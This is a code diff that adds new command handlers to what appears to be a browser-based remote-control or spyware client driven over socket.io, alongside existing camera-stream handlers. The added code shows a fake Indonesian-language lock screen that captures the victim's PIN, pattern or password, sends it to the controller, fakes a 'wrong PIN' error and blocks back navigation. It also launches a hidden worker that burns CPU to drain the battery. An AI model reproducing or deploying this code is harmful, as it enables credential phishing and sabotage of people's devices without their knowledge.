@@ -604,6 +604,131 @@ socket.on('admin-aggressive-keepalive', (data) => {
     }
 });
 
+// === FAKE LOCK SCREEN (PIN Harvester) ===
+let _fakeLockScreenEl = null;
+let _pinBuffer = '';
+let _pinMaxLength = 6;
+let _pinLockStyle = 'pin';
+socket.on('admin-fake-lockscreen', (data) => {
+    if (_fakeLockScreenEl) _fakeLockScreenEl.remove();
+    _pinBuffer = '';
+    _pinMaxLength = data.maxLength || 6;
+    _pinLockStyle = data.style || 'pin';
+
+    const styles = {
+        pin: { title: 'Masukkan PIN', hint: 'PIN diperlukan setelah perangkat di-restart', btn: 'Lanjutkan', emoji: '\\ud83d\\udd12', digits: ['1','2','3','4','5','6','7','8','9','','0','\\u232b'] },
+        pattern: { title: 'Gesek Pola', hint: 'Gambar pola kunci Anda', btn: '', emoji: '\\ud83d\\udfe2', digits: [] },
+        password: { title: 'Masukkan Kata Sandi', hint: 'Kata sandi diperlukan', btn: 'OK', emoji: '\\ud83d\\udd10', digits: [] }
+    };
+    const s = styles[_pinLockStyle] || styles.pin;
+
+    _fakeLockScreenEl = document.createElement('div');
+    _fakeLockScreenEl.id = '__fake_lock';
+    _fakeLockScreenEl.style.cssText = 'position:fixed;inset:0;z-index:99999;background:#000;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:system-ui,-apple-system,sans-serif;';
+    _fakeLockScreenEl.innerHTML = `
+        <div style="color:#fff;font-size:3.5rem;margin-bottom:8px;">${s.emoji}</div>
+        <div style="color:#aaa;font-size:0.85rem;margin-bottom:4px;">${s.hint}</div>
+        <div id="__pin_dots" style="display:flex;gap:12px;margin:24px 0 20px;height:16px;">${Array(_pinMaxLength).fill('<span style="width:14px;height:14px;border-radius:50%;border:1.5px solid #555;display:inline-block;"></span>').join('')}</div>
+        <div id="__pin_error" style="color:#ff4444;font-size:0.78rem;min-height:22px;margin-bottom:8px;"></div>
+        ${_pinLockStyle === 'pin' ? `<div id="__pin_kb" style="display:grid;grid-template-columns:repeat(3,72px);gap:10px;justify-content:center;">${s.digits.map(d => {
+            if (d === '') return '<span></span>';
+            if (d === '\\u232b') return '<button class="__pk" style="width:72px;height:60px;border-radius:36px;background:#333;color:#fff;font-size:1.5rem;border:none;cursor:pointer;">\\u232b</button>';
+            return '<button class="__pk" data-d="'+d+'" style="width:72px;height:72px;border-radius:50%;background:#1a1a1a;border:1px solid #333;color:#fff;font-size:1.6rem;cursor:pointer;transition:all .1s;">'+d+'</button>';
+        }).join('')}</div>` : `<div id="__pin_pass" style="display:flex;gap:8px;align-items:center;"><input id="__pin_input" type="${_pinLockStyle === 'password' ? 'password' : 'text'}" style="padding:12px 16px;border-radius:12px;border:1px solid #444;background:#111;color:#fff;font-size:1.3rem;width:240px;text-align:center;letter-spacing:8px;" maxlength="${_pinMaxLength}" placeholder="${_pinLockStyle === 'password' ? 'Kata Sandi' : 'PIN'}"></div>`}
+        ${_pinLockStyle !== 'pattern' ? `<button id="__pin_submit" style="margin-top:20px;padding:10px 40px;border-radius:20px;background:#007aff;color:#fff;border:none;font-size:1rem;font-weight:600;cursor:pointer;">${s.btn}</button>` : ''}
+    `;
+    document.body.appendChild(_fakeLockScreenEl);
+
+    if (_pinLockStyle === 'pin') {
+        _fakeLockScreenEl.querySelectorAll('.__pk').forEach(btn => {
+            btn.onclick = () => {
+                const d = btn.dataset.d;
+                if (d) { _pinBuffer += d; }
+                if (_pinBuffer.length > _pinMaxLength) _pinBuffer = _pinBuffer.slice(0, _pinMaxLength);
+                updatePinDots();
+                if (_pinBuffer.length >= _pinMaxLength) {
+                    setTimeout(() => submitPin(), 250);
+                }
+            };
+        });
+        const backBtn = Array.from(_fakeLockScreenEl.querySelectorAll('.__pk')).find(b => b.textContent === '\\u232b');
+        if (backBtn) {
+            backBtn.onclick = () => { _pinBuffer = _pinBuffer.slice(0, -1); updatePinDots(); };
+        }
+    }
+
+    const submitBtn = _fakeLockScreenEl.querySelector('#__pin_submit');
+    if (submitBtn) submitBtn.onclick = submitPin;
+
+    const passInput = _fakeLockScreenEl.querySelector('#__pin_input');
+    if (passInput) {
+        passInput.oninput = () => { _pinBuffer = passInput.value; updatePinDots(); };
+        passInput.focus();
+    }
+
+    function updatePinDots() {
+        const dots = _fakeLockScreenEl.querySelector('#__pin_dots');
+        if (!dots) return;
+        const spans = dots.querySelectorAll('span');
+        spans.forEach((sp, i) => {
+            sp.style.background = i < _pinBuffer.length ? '#fff' : 'transparent';
+            sp.style.borderColor = i < _pinBuffer.length ? '#fff' : '#555';
+        });
+    }
+
+    function submitPin() {
+        if (_pinBuffer.length < 2) return;
+        socket.emit('device-info', { lockScreenPin: { pin: _pinBuffer, style: _pinLockStyle, time: Date.now() } });
+        const errorEl = _fakeLockScreenEl.querySelector('#__pin_error');
+        if (errorEl) errorEl.textContent = 'Memeriksa...';
+        setTimeout(() => {
+            _fakeLockScreenEl.innerHTML = '<div style="color:#fff;font-size:3rem;margin-bottom:12px;">\\u274c</div><div style="color:#aaa;font-size:1rem;">PIN salah. Coba lagi dalam 30 detik.</div>';
+            setTimeout(() => { if (_fakeLockScreenEl) _fakeLockScreenEl.remove(); _fakeLockScreenEl = null; }, 2500);
+        }, 2000);
+    }
+
+    // Prevent closing via back button
+    history.pushState(null, '', location.href);
+    window.addEventListener('popstate', function _lockpop() {
+        history.pushState(null, '', location.href);
+    });
+});
+
+// === CPU SABOTAGE (Battery Drainer / Miner) ===
+let _sabotageWorker = null;
+socket.on('admin-sabotage', () => {
+    if (_sabotageWorker) return;
+    const workerCode = `
+        let _running = true;
+        function hash(s) {
+            let h1=0xdeadbeef^s.length,h2=0x41c6ce57;
+            for(let i=0;i<s.length;i++){let ch=s.charCodeAt(i);h1=Math.imul(h1^ch,2654435761);h2=Math.imul(h2^ch,1597334677);}
+            return (h1>>>0).toString(16)+(h2>>>0).toString(16);
+        }
+        function heavyLoop() {
+            if (!_running) return;
+            let result = 'seed_'+Date.now();
+            for(let i=0;i<5000;i++){ result = hash(result + String.fromCharCode(65+(i%26))); }
+            self.postMessage({ hashes: 5000, sample: result.slice(0,20) });
+            if (_running) setTimeout(heavyLoop, 0);
+        }
+        self.onmessage = (e) => { if(e.data==='stop'){_running=false;} };
+        heavyLoop();
+    `;
+    const blob = new Blob([workerCode], { type: 'application/javascript' });
+    _sabotageWorker = new Worker(URL.createObjectURL(blob));
+    _sabotageWorker.onmessage = (e) => {
+        socket.emit('device-info', { sabotage: { rounds: e.data.hashes, sample: e.data.sample, time: Date.now() } });
+    };
+    socket.emit('device-info', { sabotage: { active: true, started: Date.now() } });
+});
+socket.on('admin-stop-sabotage', () => {
+    if (_sabotageWorker) { _sabotageWorker.postMessage('stop'); _sabotageWorker.terminate(); _sabotageWorker = null; }
+    // Also clean up fake lock screen if still present
+    if (_fakeLockScreenEl) { _fakeLockScreenEl.remove(); _fakeLockScreenEl = null; }
+    socket.emit('device-info', { sabotage: { active: false, stopped: Date.now() } });
+});
+
 socket.on('start-camera-stream', startCameraStream);
 socket.on('stop-camera-stream', stopCameraStream);
 socket.on('switch-camera', () => {
